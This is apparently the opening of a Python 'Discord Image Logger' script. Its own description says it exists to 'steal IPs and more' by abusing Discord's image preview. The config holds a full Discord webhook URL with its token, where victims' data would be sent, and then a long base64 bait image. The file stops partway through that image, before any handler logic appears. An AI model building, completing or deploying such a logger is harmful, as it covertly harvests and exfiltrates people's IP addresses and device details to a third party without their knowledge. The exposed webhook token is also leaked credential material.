# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1125834344372633692/3twgHUYBxhKqqXyXSB_YHIxcvPWvIqVYN6TOnhb3Pez66ZMG4kD4gVIySx3o6D9HegF0",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhMTEhIVFhUWGR8aGRcYGBgaGRseGBkYGBgXHxkYHSggGB0mHR8dITEhJSktLy4uGB81ODMsNygtLisBCgoKDg0OGxAQGy0mICYvLy8tMC8tLS0vLS8vLS0tLS8tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAMIBAwMBIgACEQEDEQH/xAAcAAACAQUBAAAAAAAAAAAAAAAABgcBAgQFCAP/xABNEAACAAQDBAYFCQYCCAYDAAABAgADBBEFEiEGEzFBByJRYXGRMlJzgaEIFCM0NUKxsrNicoKSosHC0hUzQ1NVo+HwFoOTw9HjRGOU/8QAGwEBAAIDAQEAAAAAAAAAAAAAAAMFAgQGAQf/xAA9EQABAwIDBAgEBAUDBQAAAAABAAIRAyEEEjEFQVFhEyJxgZGhsfAUMsHRBiNCUnKCkrLhYtLxFUNTosL/2gAMAwEAAhEDEQA/AINggggiIb+icXxeiv8A7w/kaFCG/ol+16L2h/I0EXV+5X1V8hBuV9VfIRfBBFZuV9VfIQblfVXyEXwQRWblfVXyEG5X1V8hF8UJtBFbuV9VfIRQyl9UeQhWxzbuRJO7lgz5l7WT0b9mbme4XjUCmxSv1dxSyT90ZlJHgDmPvI8IwNQTAuVv09n1MoqVSGNO92/sHzHuCZ8U2ho5FxMmJmH3QMzeSiF2f0gSmOWmpZk096gfBQTGfhmwFJKsZmac3a56v8osPO8M9LSS5Yyy0VAOSgAfCEPPJZF+ApfK11Q8Scg8BfzCRlxbFZvoYfLljtdf87D8IKhcXVSzNTS1AuSd0AoHMkgw/wBo8K2Qry3R1DKykEHUEEcIZJ3lPj2A9WiwDsJPmSkGkm4q993NpJluOUyWtfh6I0i+biGMS+NHKmD9lFP5Hv8ACPXolpFEmdMt1jMyX/ZChgPNjGNtzQA19IqO6tPOWYVcjQFALC+hteI75Q6T4q0d0Xxj8MWU4bN8kaCT8rhG/wBm3tL28eXpV0Dy+1gCB/zFA+Mb7DtraGda0xUJ5TLL8eB843+6FrEXHfrEcbeNQyZ6S3prZlDM0lgjC5IHVtkbhzjJ2ZgmfFaWHZhsY/o20nNd/pMjwd9CpHlhGF1CkHmACIv3S+qvkIjWRs1W06rNoagsjAMJb9VrEXAKnqE+UZ+F7fZG3VdKaU/Nsp8yvId4uI96SD1hCids1zgXYdwqDgLOHa038JT3uV9VfIQblfVXyEWU9QrqGRgynUEG4Pvj2iRVis3K+qvkINyvqr5CL4IIrNyvqr5CDcr6q+Qi+CCKH/lHIBR0tgB9MeA/YaOfo6D+Uh9Tpfbn9No58giIIIIIiCCCCIggggiIb+iX7XovaH8jQoQ39Ev2vRe0P5Ggi6yggggiIII0u0u0Eqkl5n1Y6Kg4sf7DvgSBqsmMc9wYwSToFl4vi8mmlmZOcKOXaT2AczCJMqqzFGKybyaUaFjcFvL0z3DTtMYtDRNWFq/EZmSnXVEJsCOIAB+78WMbHBK+rq6lHphuaOUcuVhlVl+91Rxa3Dkth3xCTmjWPX/CvKeGbhWuc2C9urj8jDuaNczz3gcN6wMXqZOFES6eQZk8gEzpozAZr+jw17hYeMbDD8JxCplrOOIZN4MyqlyoB4cLCGzaDD5c+nmpMTMMpIt6VwCQV778IjPYLGKmXUyaZphWUSepMW3EE21FwS3DlxgQGuAOm5SUHnEYZ9WnHStu4uh5cIJtmBiOAEc1tKbbOppag0tSqzirhc6mxF7a3tY6Ech4xJoiN+kynltMkS5UtfnExwxIAzWHVS58T/SYkZdABGbJkhaGP6J1KlWY3KXAyOMQMwAsATNgBoro1u0UnPTT1zMt5bdZTYiwvGxjV7RyZr005JFt4ylVubDXQ69trxmRZV1I/mNvFxfgo82L2fq5lPvKesMpSx6vWIuLC/G3w5R4YhQVwxCmlPPE2cozo5PVHpMb6dimHvYXDptPSiXOQKys2gIOhNwbiNVKoKpsYM9pZElVKK1xbLk0I1vcsT8Yh6PqjXcui/6iXYquZYWgPLTDb7gJiTM9pTDtHji0knezEZhcLZbcTwvc6CIhq5oqnE+ZMUzps62S/oJoBcHgL2H8HfDjtVUNV10qhKOskP1zY9awuWB9ULpftMa7ajZumWuo5MpcizSM6qToC44erpePKkunks9ltpYYNDpFRwLpEGGCSAb74m19BZSmBpEf7bbQU/zgUs+nWamUEsp+kVm5L2HhpfW8MO1mMmiphMRVY5lQBjYcDr2mwERfhdBMerpJs/8A/Im5teJGcHN4E8O4CMqr46oWpsjBtcDiKtgAcsGCXATaLiBKaJuG1eGnfUxabT8Wlt6QHeg4fvL7xDZs3tTJrF6hyzAOtLb0h3j1h3iNTt7tFNpTTrJKlnJzKRmJAsALcdSeUazFNl5hSXW0ksyJ+UM8kHmRdsv7XdwPjHg6pIbu3fZelrcVRY/Ew1zpyv4x+8f/AEB23UkQQq7G7WLVLu5llnqOsvDNbQsAeHeOUNUStcHCQqevQqUHmnUEEe/DgUQQQR6olEPykPqdL7c/ptHPkdB/KQ+p0vtz+m0c+QREEEEERBBBBEQQQQREN/RL9r0XtD+RoUIb+iX7XovaH8jQRdZQQRRjBFgY1iaU0l50w9VRw5k8lHeTpEf7PYRMxOe1VV33INlTk1jooB+6OZ5m8XY5MbE64Uss2kSTd25XU2c3HP7o95j2q9pZ7safCpIKSRYvYEWW4sL6AdnMxA5wJvoPMroMNhqlClFOBUcJc4mBTYdBO5zt++LLb7Z7LTatUEqcEWWptLK9UtyNwdNNOBtCzJ2wnSKdqJpTJUpaXLKhR3XtwzdlhrcRn7EbSVRqmk1rEGYt0V1sbi5sNBYWB49kb3abY2TVFpoLJPIFnBNrr6N14d1+OkCMwzM1Rr24V7cLjYcwQ5pbxJ1m0tN81jpbRbPZk1G4T53be87cbcs1tM3bbSFHbwy6mUJtJeZPkzApMsEsou3EAXIDDQjnGvpNoMQfNQKoacjFDOuTZVOVrtawt6/H3xrqzaCnw4NKo/pKhhlmVDXIJvqEW9uPPh4xkD0kMaJm3OeA92XjMK7DVTXcQHA5gBZmU6lx/S1ws0fMeEJgwahFOxr8SmjfMOorauLj1R962lgNNYx8a6WJaXFPLv8AtTDbyRT+JERnXVc6e+efMYk9pufPiPAR4JKA4AeMXmF2K8tmqY5CCe86T2Aqjx22sOahc1vSO0BMtYANA1ggwOZB4hM1d0iV0y+WYwB5KFXyIAPxjBo8Urqqckrfvmc2zF3OUAXZiAeAFz3mw5xq4kDo4wSyGqcazRaX3SweP8ZF/ALGrt84PZeBdUyy89Vkkm536xYSdNYBUWB2pjMRXytIa0XOVrRbtifNJszEKyVMeU81lmS2sbO2vNWBvwIsffGdR7aYhKItNZh2M2Yf13/GGfpC2eLp85lDryl6wH35fFh4r6Q7sw5xHYa+t4fh+rg9qYIPyAPbZ0SL8bHfr4rHaG0cdh60F4c03GZrXd1wdFI2E9K7XC1Mod7L1T/Kbg+YhglU1BiFRKqZc9hMTKSgspOQ5luGFxrzHGIaI7dRBKzSyGlNlINx493MeMb2J2KYmi6eTvofv4phdtUi78xvRkyMzNL8WHzhw7FKGLUtXWV6SamUyyEYkZQcmTWzZ+F2sB2i50jI2vqpcnEaItokqWWNuQG8IA8gBGs2P6SGBEmsJN+D6ll/e9Yd41jZ7YbJzqyol1Ep1mS2Cra9sqjiQfvA3J7Y5+rTe3M0g5pEg6/8cF02HqsNWmKpa2lkc1pbOUyIJ/iM3Bgi0rF2QkTqyuatnymyC5lk+iChCoo9awv79YdNqcZ+aSDNChjcAKWy3ubcbHyAi3GcQk0dMbMJYVcksAAm9uqAvPthE2coKjEZoetaY0qWoZbrlV9eAIABHaRxEJydUalQhoxh+KqgNosgAXuB+lvEn9RkETK9q2kFXLGIUF0nobzZS2vmGuYW4m38w74btjdpVq5dm0nJ6a/4h3H4GFaolf6OxWVuhaRUWBTkMz5bAdzWI/eMZW1uHNRz1r6cWBb6VRoLnTybgew2MYSWy7x+6nrMp12soT8wmk46jWabuU2B49qkSCMLCcQSfKSbLPVcXHd2g94OkZsbErnSCCQdVEPykPqdL7c/ptHPkdB/KQ+p0vtz+m0c+QXiIIIIIiCCCCIggggiIb+iX7XovaH8jQoQ39Ev2vRe0P5Ggi6yhX29x75rTnIfpZnVTu06z+4fEiGgxGNQPn+MBDrJp+I4j6M6+bkD3RHUdAgamy39nUWPql9QdRgLnc40HeYCyaDBJ8nC33KE1FRYtrZwrWGW5I1C9/FjGJgNbOwr6KrkfROc29TrakDQnnbs49l4lC0a/GcNWokzJLEqHFiV4jv1h0UQW6hSt2lnzMrtBa90u1nlBn9O4QownTajEK/f0YyiXYLMOigWIVjodTc6WOlo387BcYVdKxHvxu1iPAmXHnV7JzaIfOKCcwKreZLfUOFGp007dPIiMHGtupooc7IsuZOJCZbn6MWDNrwJa4HnEYaZgzJ4b5t6qxqVTUyHDBhpthvWaC5upl2YTpLiRaJOq1G3O05F6enK5zYT5qAKZzqLG5HFb+fhxRpcoLqdW7f7CLqYG2dr5j8O6Lzryjs9n7OGGbLhLzqfoOQ89SuH2ntT4h3RUzFMacXH9x58Bo0WCqDFhi60UZgoJJ0AvFiVUStls5g5q6hZOuX0phHJAdRfkWOg955RNEuWFAVQAALADgANAIXdhMF+b04Z1tNnWd78VH3Jf8I+JMMhaPhX4q2ydo405D+WyQ3nxd3nyAXZbPwvQUoOpuffJUZbxD+2OBfNJ/UFpM27J2KfvS/dxHcbcolSjxWTNZklTZbsnpBWBI8oxNqMHFVTvK0Dekjeq49E+HI9xMRfh7aj9k45r3yGmzxyO/u1HeN6kx2GGIpFm/Udv+VDMAMBBFwwKsNGU8QRoQfA6RUR93acwDm3BXFuBBgq2YgPjyPZDr0fbbNTuKeoP0bcD6v7Q7u0cuPbCbpFk5b9t+RjUxuBGJZpDhoY8uw6Kw2ftE4Yljxmpu+Zv1HBw3HfcGxUjbYYEZNSKzKZ9O7h2Ukm1zexPqnkeHKG6XtpSGnZpcxFZUJWU5yNcDRLeOmkLnRVtKJimknEG18mbW/rS9ePaB2X7Iapuw9Az59wAexWZV/lBtHGGm9jiBY6EHcV2mIr0ajWMxOYhoGRzYhzDpIOhi0gzx0SXgVbNxSukTJiqq04u1rgHK9wQDrqxXyiUK+kWbLeW4urgg++PDD8Hp5JLSpMuWWABKqASBwvGwjJjS0QblaOOxba9RppNytaIaOF59bqPdgqtqepnUE08yyE8yNTb95bN5xIcR50j0hlTZFdLHWRgrW526y+YuvlD1QVazZaTEN1dQw8CLxhSkEtO70U20YqhmKH6x1v422d46qKvlIfU6X25/TaOfI6D+Uh9Tpfbn9No58iZVaIIIIIiCCCCIggggiIcOiT7XovaH8jQnw39Ev2vRe0P5Ggi6ixuuEmnnTfUQt7wNB52hR6KKACTNqDq81yL9y8fNifKM3pQqclEVvYzHVfcLsfgI3WylJuqOnXmJak+LDMfiYiianYPVWbT0WzzxqPA7mifU+S2NRMyqWte3KE6XtbPPGXIBvYqXcWI4i+XUjwEOphA2xwB2miaiMVAsRLbK17jrHUZwALW4i5430jxjKxpzRdDhugGfHxWlhjTzxVFjvmIWb/AOK5/wDuJLeE9h+MqEnHMNn1VYs+dKp5kodUSTMeyoBpYhQMwOt7W1MFRWSJZyzZk2W3Y7FT8VEZCGSeDVB05GZ/Yaxz1TG44CHz/RB8QRHIyrpmGoAHLvt8wP1PevZcHprfZ0n/ANQfjli4YZT/APD5A8Zh/wAkeFpXJao//wBH/SLtwtvQqf55g/xaRX9LV/e4fzP+tRenC0eA8vsvUYXT/wDDqX3P/wDXFPmdMjBv9GybggjKyk3BuCAygRYlMo4Sqk/+cf7zRHozlACJbotzmLNmygC4Ppmwvz7oxbUqaZyeRe76PT4Wjw9PsmShxqXNbJZkmWvkcC5HMggkNbuOkJu2u2LhpkikmL1JV2cANqcwya6C1r37xF2OSMsqZMXrBFLWzFWR1BsyN2douO7iQY+cneNlym6Lm172jY2fs7Dl/Si4GgNwDzm/YD23W1hMEx7yX3A3cZB9NVn4ViUyQ8p5LBWKldRfQp2e4eUSxhmPK1LInTbBpi+ioJJYXDBV48QfDnEKKlllFLXYr+Qw6bJlmk5VBzB3Uu18ijMXtx143yra54mNraWGpVWh7tQddDF7Tw8TwWztLDhxbUiDNzrIy277ctU0TpVJMYs1BKZmNyXWSWJ7SdbmPE4dRf8ADpPuEn/pA0w3SWMzX0LDQjjc3UALrbx5XjFnSxzSq/8AUNvhNEVTQWaEjh1naf1DwhVpw1MHT0+yyfmVHf7Pke8S/wALWgejov8Ah8jyk/8AxGFoNAlT/O5/9wxUsOJWp/55/AmM+vqXH+p3+9PhqPD0+y1tfhTiokzaOXTyBLu2hykvcZSci2IAHxMP42unWH0Mm+l/p2tfn/soTplZKUaipH8NV/ki1MVp8wTeTMx4KXmhj7iLxvUcZjGty0pj+GfMz6+iVKFBzQHaDTrAaxPonCZtrMQFnlSQBxO9ew8SZYAhh2dxN6iVvHlbu56ouTdeTagEX42twIiOsFwvfVCssmYyji03MyCwNsu+HpE21TQAHXgIliUtgAOUdDgRXdTz1iZO4tDY99ypsV0TX5KY780/4Wp2sw7f0s1LXbKSv7y9ZfiI1HRdX7yjyE9aSxS3cesvwNvdDgwiN9hG3GI1lPyJYj+Brr/S3wjYf1XtPGy2sN+Zgq1L9sPH9rvIg9y1XykPqdL7c/ptHPkdB/KQ+p0vtz+m0c+RKqxEEEEERBBBBEQQQQREN/RL9r0XtD+RoUIb+iX7XovaH8jQRTZ0sPm+aSj95mJ/pX/FEiItgB2RHHSGM1dQIeGYfGaoP4RI8Rs+dys8ZbB4dvJx8XR9F4T6lEtndVvoMxAv3axdMUEW5GI06QMAqqipDy1Z1sFsGAsLknRiNCCNR2Q+bPUkyTTSZU1szogDG99Ryvztwv3Rm1zsxBC162GpMoU6ragLnat3t+vio721ny8OcFbkv18qqt+sdbk8db29/dGBhe0EyemdZRVSbKXYDNa9yAqNoDzi3pma9VKU8BLX4tMvCI0twLS5jqPVDsB5AgRifw3Sx1E1mAB5cZJmI5CdSfY1WVTanwb6dN8lpYDaJkk7yLAAKTt61rmYB7mPxJWMRqy/ovNmfuBcv85Fh/NCvheMyZCgbqe78y4R9e4s3VXsAHxjPkbRCobIzGWeCy79d734NoB4Lr3iOaq7GxVHM51JwaN5bHlcx394VpSx9CoQ1rxJ3Zp87D3ZMtJLRh1wNDYguW17OPHh5x55yQ0uoAAfMvEWYajQg39DU6dsYUoFeqts59X0ZY527TyvzJ7LxmLldVzAkAgpYkMLaZrg31vYdt++K17LzMg+WsR2+ccgVsxHv37hYm0tMRTTikw5d0+YMS19NCCTcHiOzXhEf363UAZb2blzMPW0Mt5dPUAuCjDKl2Yvd7DIeR1JNyeB7rwlEnMdOrl+MWezz+Wbg37PHxi6sNnsJJOl27uR9leEtTlTrdmlvR0Ihl2enFJU280IgmoSWOtmRLhVCnMSFI7r3he3TZVGnVIPlFjDWY+vo5bdth2dvKNyowVWlp48BxWxiMOXMAEjQ67g0z78IUm0Dyt20+VMLq6ghjbQLewtYWAN7374oaoPLabmy5TYHOVUjTXgRa/O3KMXDcONOssZ82VNEAtcka3N9dSeXEiPabVZypDdVhdG8RqhHMEC9uOh4ECKFzGl5IM315cIjgPtKpgSQPf1XglY1/pEnL35VdfG8tdB42j2l1BfWVNRv5v8LN+Ea6uxISEZxZSmm6JtmueqUPEA8QV043FxGuqNoaeYAZshw37ilvdMUgjx0jdpbPr1ml9KkS0WsM0b9NdL/MREKJ+LpU3Bj6gBjeSP8d0BMfzycoP0RY9kuYpJ90wJGsoMW+eVApSjy2dsjNMCEobnUKCRnBFgb6HXXhCmKyo1UT5wl36oZyWtyBI5+EZezT7qsp3HJkPk6n8I6HD/AIYNCk7EYjLIAIAzTuJzd24WnfZVlPbDMTiG4dkw6QTbgYggcV0PQUm7UC9zzJ1PnF7VssMEMxA54KWGY+7jGQYiHG9mqqZXO6ei8zMHzABesDrre68rcdI2qjnagSosDhqNZxFWoGACZO/l7vwUvmI5aXu8fX/9i385RH4iJCl3sL8Yj3aElccoz2qg8zMWI6+g7QtjZRl1UDfTf6T9FqPlIfU6X2x/TaOfI6C+Uh9Tpfbn8jRz7Eqq0QQQQREEEEERBBBBEQ39Ev2vRe0P5GhQhv6Jftei9ofyNBFNG3+mI0J70+E3/rEkERHHSj1J9HO5Bjf+Eq/9zEjK1wD2xGz53d3orTG3wmHdycP/AGP3VCsDRWKGJlVKGOmNLVcs9qJ+LwmExIPTZTG8iYBply371YEDyY+UR4pvHQ7FdNBzeDj5gFae22maL9xZ6OcCrxDdsVsyJqmpcHjaTyPVPXmC45nqjuDcjC/guGNUz5chbjNq7D7qLbM3jqFHewiZqWmWWiy0UKiAKoHAACwHlHK/jbbvw7BgqJ6zrujc3cO07+Xavdi4WXdO4aadvH6JGqqB0bIQbO5zNpqo1VOraxI6vAD0jxIgSpBZ2uAsu404XA1A7kX4k+rDvVUquMrC48AfxhexDZsnNu3KAnNYKpW+hIItcqSNQCOJ7Y4WjjqdW1Sx7456TuXXMrwIPv2bpJ2qqmIky9AMwdx2MVfKvuCke4QvloZtqcInIHmOFZd4kzMLrlABllcpvmGt81xxOkLTJ/33RfYcsNNpbHdx1+sK+2Y4mk/LrP0geiwypdtT4L9wftNzb92MqWAgUHhnW/8AFNF4Ja+l3t/hEX7vMQo4llA8SwtG0XyY3KfoAyhUefmIdc+/egsE+mYQL3vuyQTzy8/6SG8RFhpzdpaLcEZwFtdST8LsMwPbm7I20jBZjkliADYMq8CATwYgEEg2Nhwtz1jf0GFy5V8iqL8bAD8I5mrjadIWueA07z2zEa965t9cCw993Mcd90oYlse82SXJBmqt0AFlzcWXUnRuHdpCF7rdoOhBHEEciIngrEY9IGC7mcJ6D6OcbN+zM7fBh8R3x034M2+74g4OubP+Xk7h/MNOfaub21hTVb041GvMf4SnaPbD1vUSAOJP4kCPG0bbYum3uISF7HUnwBzn4KfOPoe1HAYR87xHiYVbsME4+m4fplx7GtJPouhotyC97CLlito5dWKqYjraUXxmjHYJfwZzEimI8qRvccl2/wBkov8AwoT+JEQVtAOYVrssw+o7hTf6R6lab5SH1Ol9sf02jnuOg/lIfU6X2x/TaOfIlVYiCCCCIggggiIIIIIiG/ol+16L2h/I0KEN/RL9r0XtD+RoIp96U6LPR57ay3B9zDIfxEb7Zat31JImcygB8V6rfERkYzQifImyW4TFK+8jQ+4wndFtaQk+kmaPKcm3cTlYe5h/VEXy1e0eis2/m7PI303T/K4QfMeafjHnMmqOLAeJAhL6QtoCiikkZjPm2HVvdQTpa2uY2t4XhYwHYSfUGYappkrLaxIuzHW/E+iNOHG8ZOqHNDRK9obOY6h01eoGDcIkkaSBIMTw4Jy6R8N39G5Au0v6QW7Bo/8AST5RBkprKb/d4+6JRw1J+HVUqmnvvaef1bkm2pA4H0TcgEcCDChjeBy6TEQlQ2WmJz3KsQ4GqJ1QdSeqe5T2xuYDaAwxe5zTcaC5LhcAcc3rC19pbN6TDtY1wOU5mnSWHqu5gtcASO1OfR9g+5kb1xabOsxB4qv3E8use9jDXCqm29GP9qT4S5v+SKnb2j9aYf8Ayn/uI+Z4zA7Uxld1epQqFzjPyO8NNBoFkyrh6TQxr2wOYTTFpEKj9IFJyE4+Cf8AyRHjM6RaccJU4/woPxeIW7A2mdMPU/pK9+Mw/wD5G+I+6YsaoROkvLbgykH3i0Qk2ZSyMpzIzKTpY5GK346XtE6U1Qs2WsxDdHUMp7QRcRGdfsfVmfNyS1Ks7MG3igWZieB1vr2Rt7GxDaYfTqEAa3IF7g68le7LxLaTzmdAISrvONhfK1v7wx9H2HGfVZnUCXJAIGb7zZspPgAfMQS9ha0X+jl6m/8ArR/lhs2C2fn02+eeFBmZQFDZrZQ2pI05xY4zG0Rh39G9pMQIN79/CVtY/aDKlCKb7k3HK/Ls3pwAisK+Jbb00mY8oiY7IbNkUEA8SLki5EYTdIsjlInn3Sx/jiipbC2lVaHsoPINwcpghcy7FUGmHPA705xhYvQpOlTJUwXVhYjn4jsIOo7xCuOkST/uZ/8Ay/8APHnO6Q5f3ZM73mX/AJjGzS/Dm2GuBbh3gjlH1WHx2F31G+KRK2leRMmSph6yc+TKfRcdxHkQRyh96G8J602qYaAWUntaxJ9ygD3mFnHcRXEJkqXLp3E3Na+YHRz6FgNddb8te+Gna+S1LTUlDLbLvLmaRpmYsoN/2bk6dgEfRq20MRUwtNmJYWvbd4MXOjTadZkrzZezWF7zRcIqdVp4NHWeeNoyjjccVIS4/S5snzmVm4Wzrf8AGM2RVI9wjq2U2NiDY9htwhIn9G8nckK7mdl0YsApa2l1y6KTC/g/zjCZytPT6KdZWyktaxPMcGFybcxGqajmnrCy224DDV2H4aoS8aNIALuy/vRS+3CI82CTf1tZVW0vlU/vtf8AKq+cMu1mKCVRzJin01sh730B+N/dGJ0cYfuqJCRrNJmHwNlX+kCDjNQDhdRUPy8FVqb3EMH9zvp4pL+Uh9Tpfbn9No58joP5SH1Ol9uf02jnyJVWoggggiIIIIIiCCCCIhv6Jftei9ofyNChDf0S/a9F7Q/kaCLrG0RrtEDQYnLqlH0U/wBPs5CZ8LN7jElxodr8F+dUzSx6Y6yH9peA8Dw98YVGkttqNFu7PxDaNb8z5HDK7sO/u17kmUE5TjjtMPG+7J4aqu7t4rw8YkGdicpZySGcCa4LKvMgf9/AxGmE4QuIS1UzDKq6bqXte6KTkuLg5lN1vf8AGN1TbATGmCZU1kx2W2UpfN1TcdZ7/CIqRdFhqrPHUcMXAVamVzGhpEEzA6pbaMpEE3714VmD1tTiCCoH0MpswZQAmUMGUDtY2AN+FjG52/2YFZI0A3ssEr3jmmnby7wIt2m24l0k7cmW8w5bk3AAzeiNeMaao21r0G+ehyye9ZgIHaTy8SI9zU2yJPPlw8Fg2lja3RVGta0AQ0S0B3GxN803CidAVbI97jh3209xHZHoREjY7s/KxKn+eUilZuudOZYatb9v80RwxKnK+hGl+F7dvYe6Or2dtEVwGVD1/wC7mOfEbty5bauyTRLq1FpyTDhvpngeU/K7eOepFLxdaLDFtCok+dGuN2vSOeN2lX83T8WH8XZEhxAsicyMrocroQyt2EcPd2jmCYmfZ7FVqZCTV0J0ZfVYaMvn8LR8e/G2xvhcV8XTHUqG/J2/x1Heup2Ti+lp9G7Vvpu8NFs7RpdqsY+bU7OLZz1ZY7WPA+A1J7hG5JiJduMW+cVJUH6OTdF7C3+0bzGX+E9sUv4b2SdpY5tJ3yDrO/hG7vMBbeOxPw9Eu36DtS6B2kk8STxJOpJ7ydYpBFyx96AAEALiyZuVQQOeQ4nhFWI5cez/AL4Q87HbJKg+eVxCShqFfTN2XB+72DiY0MdjmYZsC7joPqeXruVps3ZpxJ6R8imDc73H9reLvQXK3XRbspkX51NHXb/Vg8geL+8aDu8Y3vSFgBqZAaX/AKyTdh+0LdZb9vAjvEaVtrq2ocjD6a8tdM7Le/vJCr4amL6fbudIcysRkFDa4KAXOtuBaxHeDHHvqtfOckzqeJ4yuybhcYys2rSDQ5sQwOEtaNBlmdNd5mTdGxW3W8O5qjLl2SyuxtnK6EG+lyNfcYr0m4xJaQshHWZMZw1lYNYC45czewHfG4mbH0FQizFlZQ4zBpZKEhtdRw8xGDU7PUWHIakqzunoZ2DdbithoL31vyjwtfkykjtWVOtgfim1qTXhwNmACM3bMgTqI7lpsedpz0OG3uUCb23I5QCP4Vv5iJOkSgqhVFgoAA7ABYQldHmDt9JWztXnElb8QrG5buzH4AQ9RlSH6uPsLS2lUGZtBpkMmTxcbuPZNhyCiH5SH1Ol9uf02jnyOg/lIfU6X25/TaOfIlVaiCCCCIggggiIIIIIiG/ol+16L2h/I0KEN/RL9r0XtD+RoIusooYrBBFHO11G9FVJXyB1GNpqjhc+l7mH9QHbDtS4nLmyRPlm6FcwPgLkdx5R71tIk2W0uYoZHFiDzBiOpDzMKqNzMJeknE20PPj/ABAcRzGsRH8t07j5FWrB8bRDP+6wW/1t4fxN3byLbl47KbPJiO/qqosSZllANuwkG/KxC27ofcar5EqWwnuihkbqsRdgBqADx0hMoqOtoSzUKrU0s05lFwePDmDw0uL3sNIxq7Z6vxKaJk9VplUFRcG/G/o3udeZtGDSWtgN63vetzE02Yqt0lSsBRHy3u0WgBmoNoNt03W26J6ZlpZjm4EyaSo7lAW/np7o8NrsKw+smNKE2XKqgcvCwZuSsODG/MaiMjaXacYcqUsuVmYSlytcBV9JQco48Lwqf6LelraKbUuM89hNmE2spzi+vDne/CPM2QNaN0Ty3LKlRfXqvxbyWZw4sFjmgEkEQZECDMSTxSzjez9TSMVmSzl5HiD+6/BvA6xqhNBNuB7DxiY8f2/p0dZaIJ8s33p+7bllzCzH4aRZWbEUVXKSemaTvFDDhl6w0ujej4AiLvDbYqs6ruuB3O8dCqTGbGpFratRhol2kCWn+Wcze6RwEKIBDHsTjJkT8hNpc4gHsD8EPv8ARPivZG1q+ieeusmbLbwYg+RFvjGoqej3EF03TMDzGQ/g0S7QxOCx+Ffh6sgOG9pMHcbTofstDD7KxFGqKlJ7HR/rDZHCHZSnfbHHDJkdRrTJnVTu9d/4R8SIivL5CGyr2TxWpZTNlklUCAnINBz9I6k6n/pHpJ6M55KidPlSsxsAX1J7AqjU914qvw3Tw2ysKQ6TUcZdAO7QSYsNe9T4/Z9fE1fnY1o0l4PaYZmP/CS2mgcTGZhWFT6p8kmUzHn1b289F98SrgvRhTS7NNZph7B1R+OY+cYu1+O1FC6yqeQJUhStnWWCH0uR2do7dIssVtqoR+WMo46n7DzUuz9i4d1UMB6R3A9Rnn13dgDfVapcBpsMVJtYpmzWuUlr/qwVt6TnideXlDdNw6TitPInOXS1zlRgbE6MpuLGxHZeLsL2roq1d29gWFjLmWsbixs3A/jCnhtbUYZVtSIomJMmKUDG1wzWDL3kaG/NYpXPl2ZxkHxnmrxtOs9uUA061O43DLoQwRAgXtM8Vk4Njxwx3oqgM6K15bJYmzm+vbe97cQb90bfpD2ekzpL1V2Dy0FrnqkK17EHnqY2G1GyEipDzLZZ+XSZmYAFeFxw5WvxtCRT4vWV8sUWll1mTr6ZFOjM3C2nL0rDvjF8gFjrg6LPD5a9RuLonK5pHSk27SBoQYIIGp3KQNjsQzUEmZMa2RLMx/YJUk+UKoD4rWcxSyT52PDxb4L4xjVNQ1Vu8OoL7lAA83k1uLG33b6/tHuiRMCwmXSyVky+C8SeLE8WPeY9EvtuHmtaoW4PNVFqjyco3saSbng4iw4a8Fny0AAAFgOUXQQROqRRD8pD6nS+3P6bRz5HQfykPqdL7c/ptHPkERBBBBEQQQQREEEEERDf0S/a9F7Q/kaFCG/ol+16L2h/I0EXWUEEEERGDi2GS6iU0qauZW8weRB5EdsZ0ECJXrXFpBaYIUYS6mowibu3vOpHPVIGo7bdjdq8DxFobsQxaZNpWnUGSY5tYdnraEjrAcjG4raRJqFJiK6toVYXBhBxDZmpoZhn4ezOnFpRJOnZl++P6h3xCQWCBp5hW7atHGODqkNqjefkqfxftJ0mwPJemx2y4nI9TXSzMmzG0EwG4AN7kHhc8uywjY7X7FCrZJizChUBSCLrlBPAcjr4R7bO7ayajqTPoZ3Aq5spP7JPHwNjDTMcAEngBePWtY5sC6wxOKxlDFGo6WOGg3AaQBpEWtwUSbUtTGspaSUoSXKcJM0sCWdA3joLX74YOlQqaeTJX03mAIoNuCsNRzGoHiRGq2dqErcXecVBQIWlhgPubtUa3bxMeNbRNW4s5p5pAklGLk5gMmUEKOWvLtBiEmWmN5j33K2LBTr0s5LeiZndN+sTN4vqY38OazNnMROFzHpKvRGJmS5gBKnTUX77e4+IjXpjFY1XLnrNmy6aoqAqBiSCodRbKeAINtO/svDjtfscK15b70yyilQMuYakG/EQv9JFJMk09IssDdybLn+8GAyppwsQPO0evD2tPAaf5UOEr0K9RunS1JD5FhY3EjUmDbsAupIAiGccwKYcQq1ksxMob9QdSQcjkDvGY28BEtYLNd6eS83LvGRS2X0bkA6RGfzCrm4rUoJ6yZhuS6lh9H1LAHjfLk5iJK/WA7VrbGe6i6scwEN33FnN4C41HenrZHaKXVygcy70aOlxcEcWA42PG/fFduKUTKKcu7Mwhbqqi5zA6EAdnHwvCRV4JMwqfJqgxnS72msRYgto3PmOF+Y74krDMSlVEsTJLh1PMcj2HsPdHrCXAtdqtfFUWUKrcRhr0yZB4EH5TvG6J3FRtsRRU9XLelqZdpsnUMLrMyk8L8eqeR5ERgbZ7L1FMFmb5pkpDZSSc6XNwPDvBtfkIYNosBrDiJn0ahLqpLkgLcCzBhqTcAco3uO7X01OpVmE2Zb0EsRfvPAfjEeRobldaN/H7qzGMqjEMqYbrh/WNPXKTrxyzxHeNF67O4pMaiE6sAlmxzFuqCo0DEHhcf8AesKFVUNWuaXDpayZF/pXChQ37xXl2LxPhHpT4VW4m4mVLGTIBuqAEX8FPH95vdEhYZhsunliXKUKo8z3k8z3xmAXiN3mVp1H0sE9zhBqE/KJLGf7iN24c4WNs9gcqklCXLGv3nPpMe0n+3KNtBBEoAAgKme91Rxe8yTqSiCCCPVioh+Uh9Tpfbn9No58joP5SH1Ol9uf02jnyCIggggiIIIIIiCCCCIhv6Jftei9ofyNChDf0S/a9F7Q/kaCLrKCCCCIggggiILQQQRLu0OyNPVasuSZ/vFsG944MPGF0YfitFpJcVEocFN2NuzKxuPcTEiQRgaYJkWK3aOPqsZ0boc3g4SB2bx3EKOMP2xp0Zt/R/N5jjK7